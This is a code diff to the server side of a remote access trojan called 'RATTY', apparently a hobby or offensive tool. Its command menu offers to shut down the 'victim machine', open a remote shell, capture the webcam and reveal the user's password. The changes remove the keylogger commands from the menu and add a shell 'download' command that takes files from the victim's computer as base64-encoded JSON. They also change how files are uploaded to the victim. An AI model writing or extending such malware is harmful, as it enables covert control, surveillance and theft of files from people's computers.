@@ -2,8 +2,8 @@
 
 import socket, subprocess
 import pyfiglet
-import time
-
+import json
+import base64
 
 class SERVER:
     # initialize the server
@@ -27,7 +27,8 @@ class SERVER:
         # decoding ipv4 to print the connection IP address
         clientip = client.recv(1024).decode()
         print(f'Connection established with {clientip}')
-        
+    
+    
     # setting up function for webcam accessability for later use
     def vidstream_server(self):
         try:
@@ -58,7 +59,10 @@ class SERVER:
         
     # prompts given to the user to run commands in the cli    
     def prompts(self):
-        print('============================== Commands: ============================== \n \n shutdown                      turns off victim machine \n shell                         makes a shell to interact with victim machine \n webcam                        captures webcam \n webcamoff                     turns off webcam \n monitoron                     turns on monitor \n monitoroff                    turns off monitor \n gimmepw                       gives user password \n keyloggeron                   turns on keylogger \n keyloggeroff                  turns off keylogger \n upload                        uploads file \n help                          show all commands \n exit                          exit RATTY\n \n======================================================================\n \n')
+        print('============================== Commands: ============================== \n \n shutdown                      turns off victim machine \n shell                         makes a shell to interact with victim machine \n webcam                        captures webcam \n webcamoff                     turns off webcam \n monitoron                     turns on monitor \n monitoroff                    turns off monitor \n gimmepw                       gives user password \n upload                        uploads file \n help                          show all commands \n exit                          exit RATTY\n \n======================================================================\n \n')
+    
+    def shellhelp(self):
+        print("To download a file from the client's computer, type: download <file_name_with_extension>")
         
     def mainloop(self):
         self.rattylogo()
@@ -70,11 +74,26 @@ class SERVER:
             match command:
                 case 'shell':
                     client.send(command.encode())
+                    self.shellhelp()
                     while True:
                         command = str(input('$ '))
                         client.send(command.encode())
                         if command == 'exit':
                             break
+                        elif command == '':
+                            continue
+                        elif command[:8] == 'download':
+                            json_data = client.recv(1024).decode()
+                            print(json_data)
+                            convert_json = json.loads(json_data)
+                            name = convert_json['name']
+                            bytes = convert_json['data']
+                            b64decoded_bytes = base64.b64decode(bytes)
+                            file_name = name.split('.')
+                            file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}",'wb') #open in binary       
+                            # receive data and write it to file
+                            file.write(b64decoded_bytes)
+                            file.close()
                         data_output = client.recv(1024).decode()
                         print(data_output)
 
@@ -101,11 +120,15 @@ class SERVER:
                 case 'upload':
                     filename = str(input('What file would you like to upload include extension: '))
                     file = open(filename, "rb")
-                    client.send(command.encode())
-                    client.send(file.name.encode())
-                    time.sleep(1)
                     bytes = file.read(1024)
-                    client.send(bytes)
+                    base64_bytes = base64.b64encode(bytes)
+                    file_json = {
+                        "name" : file.name,
+                        "data" : base64_bytes.decode()
+                    }
+                    file_send = json.dumps(file_json)
+                    client.send(command.encode())
+                    client.send(file_send.encode())
                     
             
                 case 'help':
